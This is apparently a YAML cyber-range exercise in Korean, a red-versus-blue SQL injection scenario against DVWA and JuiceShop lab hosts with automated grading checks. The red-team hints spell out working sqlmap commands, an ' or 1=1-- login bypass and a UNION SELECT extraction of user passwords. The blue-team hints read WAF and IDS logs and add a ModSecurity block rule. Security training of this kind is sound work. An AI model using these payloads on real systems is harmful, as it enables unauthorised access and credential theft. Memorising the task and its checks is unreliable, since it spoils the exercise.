@@ -1,0 +1,107 @@
+id: "sqli-vs-waf"
+title: "SQL Injection vs WAF 방어"
+description: "내부 감사 결과 웹 애플리케이션에 SQL Injection 취약점이 존재할 가능성이 보고되었다. Red Team은 JuiceShop과 DVWA를 대상으로 SQLi를 통해 인증을 우회하고 데이터를 추출해야 한다. Blue Team은 ModSecurity WAF 로그를 분석하고 차단 룰을 강화하여 공격을 무력화해야 한다."
+difficulty: "easy"
+time_limit: 1800
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "sqlmap을 사용하여 DVWA(http://10.20.30.80:8080)의 로그인 페이지에 SQLi 취약점이 있는지 테스트하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --level=1"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "sqlmap"
+
+  - order: 2
+    instruction: "JuiceShop(http://10.20.30.80:3000)의 로그인 페이지에서 SQLi로 관리자 인증을 우회하라. curl을 사용하라."
+    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "token"
+
+  - order: 3
+    instruction: "sqlmap으로 DVWA의 데이터베이스 목록을 열거하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --dbs"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "available databases"
+
+  - order: 4
+    instruction: "UNION SELECT 기법을 사용하여 DVWA에서 사용자 테이블 정보를 추출하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user,password+FROM+users--+&Submit=Submit' -b 'security=low; PHPSESSID=test'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "admin"
+
+  - order: 5
+    instruction: "JuiceShop에서 검색 기능의 SQLi 취약점을 테스트하라."
+    hint: "curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "data"
+
+blue_missions:
+  - order: 1
+    instruction: "ModSecurity 감사 로그에서 SQL Injection 탐지 이벤트를 확인하라."
+    hint: "cat /var/log/apache2/modsec_audit.log | grep -i 'sql' | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "SQL"
+
+  - order: 2
+    instruction: "Apache 에러 로그에서 SQLi 공격 흔적을 분석하라."
+    hint: "cat /var/log/apache2/error.log | grep -i 'ModSecurity' | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "ModSecurity"
+
+  - order: 3
+    instruction: "ModSecurity에 UNION SELECT 패턴을 차단하는 커스텀 룰을 추가하라."
+    hint: "echo 'SecRule ARGS \"union.*select\" \"id:100001,phase:2,deny,status:403,msg:Custom SQLi Block\"' >> /etc/modsecurity/custom-rules.conf"
+    points: 20
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 4
+    instruction: "Apache를 재시작하여 새 룰을 적용하고 정상 동작을 확인하라."
+    hint: "systemctl reload apache2 && systemctl status apache2 | head -5"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "active"
+
+  - order: 5
+    instruction: "Wazuh에서 SQL Injection 관련 알림을 확인하라."
+    hint: "cat /var/ossec/logs/alerts/alerts.json | tail -50 | grep -i 'sql'"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "sql"
+
+  - order: 6
+    instruction: "suricata에서 SQLi 시그니처 탐지 로그를 확인하라."
+    hint: "grep -i 'sql' /var/log/suricata/fast.log | tail -10"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "SQL"
